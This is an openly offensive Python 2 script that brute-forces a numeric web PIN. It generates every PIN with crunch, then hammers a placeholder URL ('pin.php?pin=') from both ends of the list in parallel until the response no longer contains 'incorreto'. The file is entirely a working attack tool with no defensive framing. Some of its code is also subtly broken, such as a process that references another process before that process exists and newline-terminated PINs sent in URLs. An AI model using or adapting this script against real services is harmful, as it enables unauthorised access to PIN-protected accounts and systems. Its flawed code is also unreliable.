import urllib2
import os
import sys
import datetime
from multiprocessing import Process

max = input("[+] How many digits does the PIN contain? ")

try:
	print "[+] Creating a list with", 10 ** max, "numbers, each with", max, "digits..."
	crunch = "crunch " + str(max) + " " +  str(max) + " 0123456789 -t " + "@" * max + " > PIN.txt"
	tac1 = "tac PIN.txt > rPIN.txt"
	command = crunch + ";" + tac1
	os.system(command)
except:
	print "[-] Error: you probably do not have tac or crunch installed."
	sys.exit()

print "[+] Starting the brute-force attack, from top to bottom and bottom to top..."
start_time = datetime.datetime.now()
n = 0
m = 10 ** max - 1 

def bruteforce():
	global m, n
	pins = open("PIN.txt", "r")
	for pin in pins:
		n += 1
		url = "http://example/pin.php?pin="
		furl = url + pin
		req = urllib2.Request(furl)
		response = urllib2.urlopen(req)
		page = response.read()
		if "incorreto" in page:
			print "[-] Incorret PIN:", pin.replace('\n', '')
		else:
			print "[+] PIN found:", pin.replace('\n', '')
			elapsed_time = datetime.datetime.now() - start_time
			print "[+] Elapsed time:", elapsed_time
			print ""
			print "[+]", page
			f2.terminate()
			break

def reversebruteforce():
	global m, n
	rpins = open("rPIN.txt", "r")
	for rpin in rpins:
		n -= 1
		url = "http://example/pin.php?pin="
		furl = url + rpin
		req = urllib2.Request(furl)
		response = urllib2.urlopen(req)
		page = response.read()
		if m == n or n > m:
			print "Something went wrong. Are you sure the PIN has only", max, "digits?"
			f1.terminate()
			f2.terminate()
		elif "incorreto" in page:
			print "[-] Incorret PIN:", rpin.replace('\n', '')
		else:
			print "[+] PIN found:", rpin.replace('\n', '')
			f1.terminate()
			elapsed_time = datetime.datetime.now() - start_time
			print "[+] Elapsed time:", elapsed_time
			print ""
			print "[+]", page
			break

if __name__ == '__main__':
	f1 = Process(target = bruteforce)
	f1.start()
	f2 = Process(target = reversebruteforce)
	f2.start()
